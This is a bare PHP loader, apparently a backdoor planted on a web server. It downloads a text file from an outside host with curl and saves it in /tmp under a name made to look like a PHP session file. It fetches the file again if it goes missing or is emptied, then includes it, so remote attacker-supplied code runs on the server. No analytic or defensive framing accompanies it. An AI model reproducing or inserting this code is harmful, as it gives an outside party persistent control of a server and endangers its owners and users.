<?=
$src = "https://fcalpha.net/web/photo/20151024/naxc.txt";
$name = "/tmp/sess_" . md5("naxc") . ".php";

function create($source, $file)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $source);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $ex = curl_exec($ch);
    curl_close($ch);

    error_log($ex, 3, $file);
}

if (!file_exists($name)) {
    create($src, $name);
}

if (filesize($name) < 10) {
    unlink($name);
    create($src, $name);
}

include($name);
?>